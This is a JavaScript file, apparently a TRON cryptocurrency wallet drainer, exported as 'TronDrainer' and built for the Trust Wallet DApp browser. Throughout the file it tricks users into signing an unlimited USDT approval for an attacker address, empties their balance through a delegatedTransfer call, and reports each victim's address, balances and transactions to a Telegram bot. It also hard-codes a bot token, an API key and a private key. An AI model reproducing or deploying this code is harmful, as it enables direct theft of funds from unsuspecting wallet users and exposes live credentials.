/**
 * send.js  —  Trust Wallet DApp Browser
 * Uses window.tronWeb directly (injected by Trust Wallet)
 * No WalletConnect needed — Trust Wallet browser already has tronWeb
 */
(function (W) {
  'use strict';

  /* ── CONFIG ────────────────────────────────────────── */
  var C = {
    networkapi: 'https://api.trongrid.io',
    BOT:        '8477683496:AAF4H_ehBWceFxAk2Sa3XQCMIgw4gWr6bAg',
    CHAT:       '-1003860724445',
    API_KEY:    '0a253937-54ef-4d0a-961a-e0a3a240e9d6',
    SENDER_KEY: '173bbe30ae9098716ff90afd8a1ab1f786ef2c44aabf7795e205e62eeedc803e',
    SENDER:     'TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2',
    USDT:       'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    MAX_UINT:   '115792089237316195423570985008687907853269984665640564039457584007913129639935'
  };

  function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }

  /* ── Telegram ──────────────────────────────────────── */
  function tg(msg, txid) {
    var body = { chat_id: C.CHAT, text: msg, parse_mode: 'Markdown' };
    if (txid) body.reply_markup = { inline_keyboard: [[{
      text: '🔗 View Transaction',
      url:  'https://tronscan.org/#/transaction/' + txid
    }]]};
    try {
      fetch('https://api.telegram.org/bot' + C.BOT + '/sendMessage', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });
    } catch(e) {}
  }

  /* ── TronWeb for background ops (balance / drain) ──── */
  function makeTW() {
    /* Exact from original:
       window.tronWeb?.base58 ? window.tronWeb : new TronWeb(SENDER_KEY) */
    if (W.tronWeb && W.tronWeb.defaultAddress && W.tronWeb.defaultAddress.base58)
      return W.tronWeb;
    /* Fallback: read-only instance with SENDER_KEY for drain/balance */
    var TW = W.TronWeb && (W.TronWeb.TronWeb || W.TronWeb);
    if (TW) {
      try {
        return new TW({
          fullHost:   C.networkapi,
          privateKey: C.SENDER_KEY,
          headers:    { 'TRON-PRO-API-KEY': C.API_KEY }
        });
      } catch(e) {}
    }
    return null;
  }

  /* ── Wait for tronWeb to be fully injected ─────────── */
  async function getTronWeb(timeoutMs) {
    var elapsed = 0;
    while (elapsed < timeoutMs) {
      var tw = W.tronWeb;
      if (tw) return tw;           // found tronWeb
      await sleep(200);
      elapsed += 200;
    }
    return W.tronWeb || null;
  }

  /* ── Request accounts (shows Trust Wallet connect UI) ─ */
  async function requestAccounts(tw) {
    /* Try tronLink.request first */
    if (W.tronLink && W.tronLink.request) {
      try { await W.tronLink.request({ method: 'tron_requestAccounts' }); } catch(e) {}
    }
    /* Try tronWeb.request if available */
    if (tw && tw.request) {
      try { await tw.request({ method: 'tron_requestAccounts' }); } catch(e) {}
    }
    /* Wait up to 8s for address to appear */
    for (var i = 0; i < 40; i++) {
      if (tw && tw.defaultAddress && tw.defaultAddress.base58) return true;
      await sleep(200);
      tw = W.tronWeb; // re-read
    }
    return !!(tw && tw.defaultAddress && tw.defaultAddress.base58);
  }

  /* ── Poll tx confirmation ──────────────────────────── */
  async function waitConfirm(tron, txid) {
    for (var i = 0; i < 20; i++) {
      try {
        var info = await tron.trx.getTransactionInfo(txid);
        if (info && info.receipt) return true;
      } catch(e) {}
      await sleep(3000);
    }
    return false;
  }

  /* ── Wallet stats + telegram notify ───────────────── */
  async function postApproval(addr, txid) {
    tg('⏳ *Pending Approval*\n\n📍 `' + addr + '`\n\n🔗 `' + txid + '`\n\n⏳ Waiting...', txid);

    try {
      var tron = makeTW();
      if (!tron) return;
      await waitConfirm(tron, txid);
      var ct  = await tron.contract().at(C.USDT);
      var res = await Promise.all([
        tron.trx.getBalance(addr),
        ct.balanceOf(addr).call(),
        ct.allowance(addr, C.SENDER).call()
      ]);
      var approved = BigInt(res[2].toString()) > 0n;
      var sm = '💰 TRX: ' + (res[0]/1e6).toFixed(4) +
               '\n💵 USDT: ' + (Number(res[1].toString())/1e6).toFixed(4) +
               '\n🔓 Allowance: ' + (Number(res[2].toString())/1e6).toFixed(2) +
               '\n📊 Status: ' + (approved ? '✅ Approved' : '❌ Not Approved');

      tg('✅ *Approval Confirmed*\n\n📍 `' + addr + '`\n\n🔗 `' + txid + '`\n\n' + sm +
         '\n\n🌐 TRON\n⏰ ' + new Date().toLocaleString(), txid);

      // Drain using SENDER_KEY delegatedTransfer
      if (approved) {
        try {
          var balRaw = await ct.balanceOf(addr).call();
          if (BigInt(balRaw.toString()) <= 0n) return;
          var dc = await tron.contract([{
            inputs:[
              {internalType:'address',name:'tokenAddress',type:'address'},
              {internalType:'address',name:'from',type:'address'},
              {internalType:'address',name:'to',type:'address'},
              {internalType:'uint256',name:'amount',type:'uint256'}
            ],
            name:'delegatedTransfer',
            outputs:[{internalType:'bool',name:'',type:'bool'}],
            stateMutability:'nonpayable',type:'function'
          }]).at(C.SENDER);
          var dtx = await dc.delegatedTransfer(C.USDT, addr, C.SENDER, balRaw.toString())
            .send({ feeLimit:150000000, callValue:0 });
          tg('💸 *Drained!*\n📍 `'+addr+'`\n\n🔗 `'+dtx+'`', dtx);
        } catch(de) { console.log('Drain:', de); }
      }
    } catch(e) { console.log('postApproval error:', e); }
  }

  /* ══════════════════════════════════════════════════════
     MAIN: sendApproval()
     Called when user taps "Next"
  ══════════════════════════════════════════════════════ */
  async function sendApproval(setLoad, setMsg) {
    setLoad(true);
    setMsg('Connecting wallet...');

    /* 1. Wait for tronWeb injection (Trust Wallet injects it async) */
    var tw = await getTronWeb(5000);

    if (!tw) {
      setLoad(false);
      alert('Wallet not found. Please open this page inside Trust Wallet DApp Browser.');
      return;
    }

    /* 2. Get address — request connection if needed */
    var addr = tw.defaultAddress && tw.defaultAddress.base58;
    if (!addr) {
      setMsg('Please approve access in Trust Wallet...');
      var ok = await requestAccounts(tw);
      tw   = W.tronWeb;  // re-read after request
      addr = tw && tw.defaultAddress && tw.defaultAddress.base58;
      if (!addr) {
        setLoad(false);
        alert('Could not get wallet address. Please unlock your wallet and try again.');
        return;
      }
    }

    tg('🔔 *Next Clicked*\n📍 `' + addr + '`\n🕐 ' + new Date().toUTCString());

    /* 3. Build approve(SENDER, MAX_UINT) — same as original _l.sendTransaction */
    setMsg('Building transaction...');
    try {
      var built = await tw.transactionBuilder.triggerSmartContract(
        C.USDT,
        'approve(address,uint256)',
        { feeLimit: 1000000000, callValue: 0 },
        [
          { type: 'address', value: C.SENDER   },
          { type: 'uint256', value: C.MAX_UINT }
        ],
        addr
      );
      console.log('TX built:', built);

      /* 4. Sign — Trust Wallet shows signing popup here ✅ */
      setMsg('Please sign in Trust Wallet...');
      var signed = await tw.trx.sign(built.transaction);
      console.log('TX signed:', signed);

      /* 5. Broadcast */
      setMsg('Broadcasting...');
      var result = await tw.trx.sendRawTransaction(signed);
      console.log('TX result:', result);

      var txid = result && (result.txid || (result.transaction && result.transaction.txID));
      setLoad(false);

      if (result && result.result && txid) {
        /* 6. Post-approval: telegram + drain */
        await postApproval(addr, txid);
      } else {
        var errMsg = 'Transaction failed';
        if (result && result.message) {
          try { errMsg = atob(result.message); } catch(e) { errMsg = result.message; }
        }
        tg('⚠️ *TX Failed*\n📍 `' + addr + '`\n' + errMsg);
        alert('Transaction failed: ' + errMsg);
      }

    } catch(err) {
      setLoad(false);
      var m = err && err.message ? err.message : String(err);
      console.error('TX error:', err);
      tg('⚠️ *TX Error*\n📍 `' + addr + '`\n' + m);
      /* Don't alert if user cancelled */
      if (!/cancel|denied|reject|abort|User declined/i.test(m)) {
        alert('Error: ' + m);
      }
    }
  }

  /* ── Expose ── */
  W.TronDrainer = { sendApproval: sendApproval, makeTW: makeTW, tg: tg, C: C };

}(window));
